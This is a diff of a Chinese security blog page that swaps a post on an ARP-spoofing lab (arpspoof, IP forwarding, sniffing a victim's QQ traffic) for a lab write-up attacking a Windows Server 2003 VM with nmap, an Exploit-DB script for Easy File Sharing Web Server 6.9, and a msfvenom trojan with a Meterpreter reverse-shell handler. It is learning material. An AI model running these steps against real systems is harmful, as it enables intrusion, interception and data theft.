@@ -16,39 +16,39 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content=".ARP欺骗首先了解ARP功能： ARP存在于数据链路层，a节点传输数据给b节点ARP通过将传输b节点的ip转化为MAC地址再通过MAC地址将数据传输到b节点实现数据传输. 网络传输拓扑：  A主机向内网ip传输数据包: A主机如果要根B主机进行数据传输就一定要知道对方的MAC地址，如果没有MAC就会发送广播数据包给交换机，交换机发现是广播数据包后就会给局域网内的每一个设备发送这个数据包，B主机接">
+    <meta name="description" content=".靶机:Windows Server 2003 Standard Edition和ExpNIS.Windows .攻击机:本地物理机和kali .将easy file sharing server的文件放到windows 2003虚拟机中  首先首先ipconfig查看虚拟机C段  利用nmap对其进行扫描C段 1nmap 192.168.200.0&#x2F;24   查看系统 1nmap -O 192.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="arp欺骗">
-<meta property="og:url" content="http://example.com/2023/12/17/arp%E6%AC%BA%E9%AA%97/index.html">
+<meta property="og:title" content="server打靶">
+<meta property="og:url" content="http://example.com/2023/12/22/server%E6%89%93%E9%9D%B6/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content=".ARP欺骗首先了解ARP功能： ARP存在于数据链路层，a节点传输数据给b节点ARP通过将传输b节点的ip转化为MAC地址再通过MAC地址将数据传输到b节点实现数据传输. 网络传输拓扑：  A主机向内网ip传输数据包: A主机如果要根B主机进行数据传输就一定要知道对方的MAC地址，如果没有MAC就会发送广播数据包给交换机，交换机发现是广播数据包后就会给局域网内的每一个设备发送这个数据包，B主机接">
+<meta property="og:description" content=".靶机:Windows Server 2003 Standard Edition和ExpNIS.Windows .攻击机:本地物理机和kali .将easy file sharing server的文件放到windows 2003虚拟机中  首先首先ipconfig查看虚拟机C段  利用nmap对其进行扫描C段 1nmap 192.168.200.0&#x2F;24   查看系统 1nmap -O 192.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/image-20231217105156743.png">
-<meta property="og:image" content="http://example.com/images/image-20231217134350409.png">
-<meta property="og:image" content="http://example.com/images/image-20231217134507822.png">
-<meta property="og:image" content="http://example.com/images/image-20231217134633779.png">
-<meta property="og:image" content="http://example.com/images/image-20231217134837988.png">
-<meta property="og:image" content="http://example.com/images/image-20231217140220094.png">
-<meta property="og:image" content="http://example.com/images/image-20231217140253316.png">
-<meta property="og:image" content="http://example.com/images/image-20231217140628776.png">
-<meta property="og:image" content="http://example.com/images/image-20231217140744349.png">
-<meta property="og:image" content="http://example.com/images/image-20231217142927766.png">
-<meta property="og:image" content="http://example.com/images/image-20231217142950389.png">
-<meta property="og:image" content="http://example.com/images/image-20231217143835667.png">
-<meta property="og:image" content="http://example.com/images/image-20231217143946220.png">
-<meta property="og:image" content="http://example.com/images/image-20231217144304865.png">
-<meta property="article:published_time" content="2023-12-17T02:00:54.000Z">
-<meta property="article:modified_time" content="2023-12-17T06:53:37.387Z">
+<meta property="og:image" content="http://example.com/images/image-20231222173644604.png">
+<meta property="og:image" content="http://example.com/images/image-20231222173915185.png">
+<meta property="og:image" content="http://example.com/images/image-20231222174231594.png">
+<meta property="og:image" content="http://example.com/images/image-20231222174313848.png">
+<meta property="og:image" content="http://example.com/images/image-20231222184147650.png">
+<meta property="og:image" content="http://example.com/images/image-20231222184426360.png">
+<meta property="og:image" content="http://example.com/images/image-20231222194817675.png">
+<meta property="og:image" content="http://example.com/images/image-20231222195107255.png">
+<meta property="og:image" content="http://example.com/images/image-20231222195121384.png">
+<meta property="og:image" content="http://example.com/images/image-20231222201117333.png">
+<meta property="og:image" content="http://example.com/images/image-20231222201149970.png">
+<meta property="og:image" content="http://example.com/images/image-20231222201705788.png">
+<meta property="og:image" content="http://example.com/images/image-20231222201805057.png">
+<meta property="og:image" content="http://example.com/images/image-20231222201932086.png">
+<meta property="og:image" content="http://example.com/images/image-20231222202016833.png">
+<meta property="article:published_time" content="2023-12-22T09:33:05.000Z">
+<meta property="article:modified_time" content="2023-12-22T12:28:37.417Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content=".">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/image-20231217105156743.png">
+<meta name="twitter:image" content="http://example.com/images/image-20231222173644604.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>arp欺骗 - Hexo</title>
+  <title>server打靶 - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -254,7 +254,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="arp欺骗"></span>
+            <span id="subtitle" data-typed-text="server打靶"></span>
           
         </div>
 
@@ -265,8 +265,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-12-17 10:00" pubdate>
-          2023年12月17日 上午
+        <time datetime="2023-12-22 17:33" pubdate>
+          2023年12月22日 下午
         </time>
       </span>
     
@@ -277,7 +277,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.5k 字
+          687 字
         
       </span>
     
@@ -288,7 +288,7 @@
         
         
         
-          21 分钟
+          6 分钟
         
       </span>
     
@@ -333,73 +333,61 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">arp欺骗</h1>
+            <h1 id="seo-header">server打靶</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title=".ARP欺骗"></a>.ARP欺骗</h1><p>首先了解ARP功能：</p>
-<p>ARP存在于数据链路层，a节点传输数据给b节点ARP通过将传输b节点的ip转化为MAC地址再通过MAC地址将数据传输到b节点实现数据传输.</p>
-<p>网络传输拓扑：</p>
-<p><img src="/../images/image-20231217105156743.png" srcset="/img/loading.gif" lazyload alt="image-20231217105156743"></p>
-<p><strong>A主机向内网ip传输数据包:</strong></p>
-<p>A主机如果要根B主机进行数据传输就一定要知道对方的MAC地址，如果没有MAC就会发送广播数据包给交换机，交换机发现是广播数据包后就会给局域网内的每一个设备发送这个数据包，B主机接收到数据包时就判断目的ip是否与自己一致，一致就接受并发送带有自己MAC地址的响应包给A主机，这样就实现了一个广播获取MAC地址的过程。</p>
-<p><strong>A主机向外网ip传输数据包：</strong></p>
-<p>外网ip首先用子网掩码进行比对如果不是局域网的ip就默认发给网关(数据包发到交换机，交换机发送是发给网关就会转发给网关)网关收到数据包后就利用别的协议查看将目的ip转换成目的ip的网关的MAC(这个是广义网的mac，字节数区分于以太网)..</p>
-<p><strong>ARP欺骗原路:</strong></p>
-<p>本次ARP欺骗实验是在内网环境实现实现向外网传输数据包,每一台主机ARP缓存中一开始是没有ip-MAC映射的，如果是跟内网主机进行过传输数据后就会有对方主机ip-MAC的映射，该映射是通过接收响应包然后更新自己的ARP缓存表来实现的，当然这是在设置为动态缓存的情况下才能实现更新。</p>
-<p>一台主机接收响应包来更改自己的ARP缓存，如果没有做必要的安全措施。主机只要收到发给自己的响应包就会直接更新自己的ARP缓存。这个时候就会存在攻击者恶意制造响应包发给该主机，更改该主机的ARP缓存冒充为另一台主机，这里可以冒充为网关，这样当该主机访问外网的时候，就会通过ARP协议去解析网关的ip为攻击者的MAC地址，这样在数据传输中就会将数据传给攻击者的机子上。</p>
-<p><strong>断网攻击</strong></p>
-<p>断网攻击实质上就是通过向目标主机发送网关的响应包使得目标主机对网关的ARP缓存被覆盖，导致目标主机发现外网的数据包都发到了攻击者主机那，但是计算机在接收到目的ip不是自己的数据包后就会自动丢弃。导致目标主机的数据包不是发向网关实习上网的操作，这个就相当于断了目标主机的网。</p>
-<p><strong>数据窃取</strong></p>
-<p>断网攻击中说到数据包会被计算机自动丢弃，也就是不能实现接收和转发数据包的功能。此外，断网攻击只是暂时性的，因为目标主机在发现自己断网后就会直接联系管理员，这时候目标主机就很容易发现的ARP是被恶意篡改了。要实现数据窃取就要做到让目标主机能正常上网的而没有发现攻击者的主机，这里在windows下是可以将物理机模拟成一个交换机的，也就是把一切发到主机的数据包都接收并转发出去的功能，这样当目标主机发送数据包过来的时候，就可以将数据包接收并转发给真正网关就可以让目标主机实现正常的外网通信了。</p>
-<p><strong>实验过程:</strong></p>
-<p>先确保目标主机A和攻击机B在同一个局域网内,B主机查看本地默认网关和网关的真实MAC地址</p>
-<p><img src="/../images/image-20231217134350409.png" srcset="/img/loading.gif" lazyload alt="image-20231217134350409"></p>
-<p><img src="/../images/image-20231217134507822.png" srcset="/img/loading.gif" lazyload alt="image-20231217134507822"></p>
-<p>这里一开始应该是动态的</p>
-<p>这是时候通过扫描得知A主机的ip</p>
-<p><img src="/../images/image-20231217134633779.png" srcset="/img/loading.gif" lazyload alt="image-20231217134633779"></p>
-<p>这时候利用<strong>虚拟机的kali在桥接模式下利用arpspoof构造伪造响应包</strong></p>
-<p><em><strong>arpspoof [-i 接口] [-t 目标IP] [主机IP]</strong></em></p>
-<p>接口就是网卡(这里使用kali本地的网卡)，目标ip就是要冒充的ip,主机的ip就是发送的对象</p>
-<p>arpspoof一开始需要手动下载</p>
-<p><img src="/../images/image-20231217134837988.png" srcset="/img/loading.gif" lazyload alt="image-20231217134837988"></p>
-<p>这个时候就不断向目标主机发送伪造响应包，一直发送的因为大部分计算机为了防止ARP被篡改会不断的询问该MAC地址是否正确，这里就是防止目标主机一直询问网关的MAC地址所以要一直发送数据包</p>
-<p>这个时候A主机就自己可以查看到网关对应的MAC地址已经改成B主机的MAC地址的了，这时候目标服务器就已经是上不了网了，到此断网攻击就已经实现了.</p>
-<p>如果要让A主机不察觉就要让数据包能正常发送到真正的网关处，这时候就要将B主机设置为一个可以接收和转发的交换机。</p>
-<p><strong>win11设置数据包转发功能:</strong></p>
-<p>cmd命令行中输入 <strong>Regedit</strong>打开注册表</p>
-<p>找到该文件</p>
-<p>HKEY_LOCAL_MACHINE” &gt; SYSTEM &gt; CurrentControlSet &gt;Services&gt; Tcpip &gt;Parameters &gt; IP Enable Router</p>
-<p><img src="/../images/image-20231217140220094.png" srcset="/img/loading.gif" lazyload alt="image-20231217140220094"></p>
-<p>修改该值为1</p>
-<p><img src="/../images/image-20231217140253316.png" srcset="/img/loading.gif" lazyload alt="image-20231217140253316"></p>
-<p>win+r打开Services.msc</p>
-<p><img src="/../images/image-20231217140628776.png" srcset="/img/loading.gif" lazyload alt="image-20231217140628776"></p>
-<p>找到Routing and Remote Access service这个服务改成手动</p>
-<p><img src="/../images/image-20231217140744349.png" srcset="/img/loading.gif" lazyload alt="image-20231217140744349"></p>
-<p>改为手动后点击启动，然后再重启电脑后就是一个可以用于接收和转发数据包的”交换机”了</p>
-<p>这时候理论上就可以实现数据窃取了，但为什么叫理论上呢?这是因为可以发现，我们以实行欺骗数据包是从虚拟机里面发出来的，这是会经过本地机再转发给目标主机的。既然目标主机接收到数据包后会修改ARP缓存，那从虚拟机到本地机的伪造数据包也会被本地机所接收并修改，这样本地机的网关的ARP缓存也被修改成自己的MAC地址</p>
-<p><img src="/../images/image-20231217142927766.png" srcset="/img/loading.gif" lazyload alt="image-20231217142927766"></p>
-<p><img src="/../images/image-20231217142950389.png" srcset="/img/loading.gif" lazyload alt="image-20231217142950389"></p>
-<p>这样就造成，A主机发送数据包给B主机后B主机发给网关的MAC地址是自己就又发给自己，就相当于数据包在B主机上原地打转，这个时候A和B主机是很卡的，或者说是几乎上不了网的.</p>
-<p>**为什么说是很卡而不是完全上不了网呢?**这是说到前面说的，计算机会不断向网关询问MAC地址以防止ARP欺骗，在kali发送数据包中会存在发送的间隙，导致在这个间隙中计算机就询问到真正的网关的MAC地址了得到真正的通讯，所以是很卡.</p>
-<p>可以通过绑定B主机的网关的MAC地址为静态来防止B主机也被欺骗。</p>
-<p>因为B主机是win11版本,所以绑定MAC地址要先查看<strong>以太网的idx序号</strong></p>
-<p>输入 netsh i i show in</p>
-<p><img src="/../images/image-20231217143835667.png" srcset="/img/loading.gif" lazyload alt="image-20231217143835667"></p>
-<p>得知Idx为4就输入下列命令绑定指定网关ip的MAC地址</p>
-<p>netsh -c “i i” add neighbors 4 “192.168.117.193” “b2-d6-22-d5-27-7a”</p>
-<p><img src="/../images/image-20231217143946220.png" srcset="/img/loading.gif" lazyload alt="image-20231217143946220"></p>
-<p>这样就改为静态的就不会被响应包影响了。这个时候用A主机就可以正常访问外网了</p>
-<p>B主机通过wireshark抓取A主机QQ的流量了</p>
-<p><img src="/../images/image-20231217144304865.png" srcset="/img/loading.gif" lazyload alt="image-20231217144304865"></p>
-<p>这个时候就可以看到A主机登录的QQ账号实现数据窃取了</p>
-<p><strong>安全防护</strong></p>
-<p>可以向B主机一样设置为静态的MAC地址</p>
-<p>可以在电脑上安装放ARP欺骗的软件</p>
-<p>网关对数据的传输进行探查和比对</p>
+                <p>.靶机:Windows Server 2003 Standard Edition和ExpNIS.Windows</p>
+<p>.攻击机:本地物理机和kali</p>
+<p>.将easy file sharing server的文件放到windows 2003虚拟机中</p>
+<p><img src="/../images/image-20231222173644604.png" srcset="/img/loading.gif" lazyload alt="image-20231222173644604"></p>
+<p>首先首先ipconfig查看虚拟机C段</p>
+<p><img src="/../images/image-20231222173915185.png" srcset="/img/loading.gif" lazyload alt="image-20231222173915185"></p>
+<p>利用nmap对其进行扫描C段</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.200.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231222174231594.png" srcset="/img/loading.gif" lazyload alt="image-20231222174231594"></p>
+<p>查看系统</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -O <span class="hljs-number">192.168.200.132</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231222174313848.png" srcset="/img/loading.gif" lazyload alt="image-20231222174313848"></p>
+<p>查看对应服务的版本</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV <span class="hljs-number">192.168.200.132</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231222184147650.png" srcset="/img/loading.gif" lazyload alt="image-20231222184147650"></p>
+<p>发现是 Easy File Sharing Web Server版本为:6.9</p>
+<p>使用searchsploit查找 Easy File Sharing Web Server的漏洞</p>
+<p><img src="/../images/image-20231222184426360.png" srcset="/img/loading.gif" lazyload alt="image-20231222184426360"></p>
+<p>发现6.9版本存在漏洞</p>
+<p>利用脚本攻击</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> /usr/share/exploitdb/exploits/windows/remote/<span class="hljs-number">39009</span>.py <span class="hljs-number">192.168.200.132</span> <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231222194817675.png" srcset="/img/loading.gif" lazyload alt="image-20231222194817675"></p>
+<p>发现已经执行但是靶机没有成功弹出计算器,但没有攻击成功</p>
+<p>后面换了严格windows版本的虚拟机,同上面步骤</p>
+<p><img src="/../images/image-20231222195107255.png" srcset="/img/loading.gif" lazyload alt="image-20231222195107255"></p>
+<p><img src="/../images/image-20231222195121384.png" srcset="/img/loading.gif" lazyload alt="image-20231222195121384"></p>
+<p>分析原因可能是<strong>前面的版本太低或者打开计数器的指令不一样</strong></p>
+<p><strong>接下来演示利用msfvenom生成一个可执行木马</strong></p>
+<p><img src="/../images/image-20231222201117333.png" srcset="/img/loading.gif" lazyload alt="image-20231222201117333"></p>
+<p>将文件放在靶机上</p>
+<p><img src="/../images/image-20231222201149970.png" srcset="/img/loading.gif" lazyload alt="image-20231222201149970"></p>
+<p>在攻击机上使用matesploit对指定端口进行监听</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">msfdb <span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/multi/handler<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231222201705788.png" srcset="/img/loading.gif" lazyload alt="image-20231222201705788"></p>
+<p>show options查看参数设置后设置监听的的ip和端口</p>
+<p><img src="/../images/image-20231222201805057.png" srcset="/img/loading.gif" lazyload alt="image-20231222201805057"></p>
+<p>这时候在靶机上模拟执行木马文件后，攻击机上就能成功反弹到shell</p>
+<p><img src="/../images/image-20231222201932086.png" srcset="/img/loading.gif" lazyload alt="image-20231222201932086"></p>
+<p>尝试下载靶机上的一个文件</p>
+<p><img src="/../images/image-20231222202016833.png" srcset="/img/loading.gif" lazyload alt="image-20231222202016833"></p>
+<p>下载成功!</p>
 
                 
               </div>
@@ -409,13 +397,6 @@
               <div class="post-metas my-3">
   
   
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/" class="print-no-link">#.</a>
-      
-    </div>
-  
 </div>
 
 
@@ -424,8 +405,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>arp欺骗</div>
-      <div>http://example.com/2023/12/17/arp欺骗/</div>
+      <div>server打靶</div>
+      <div>http://example.com/2023/12/22/server打靶/</div>
     </div>
     <div class="license-meta">
       
@@ -437,7 +418,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年12月17日</div>
+          <div>2023年12月22日</div>
         </div>
       
       
@@ -469,18 +450,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/12/22/server%E6%89%93%E9%9D%B6/" title="server打靶">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">server打靶</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/12/04/pikachu%E4%B8%8Eupload-lab%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" title="pikachu与upload练习">
-                        <span class="hidden-mobile">pikachu与upload练习</span>
+                      <a href="/2023/12/17/arp%E6%AC%BA%E9%AA%97/" title="arp欺骗">
+                        <span class="hidden-mobile">arp欺骗</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
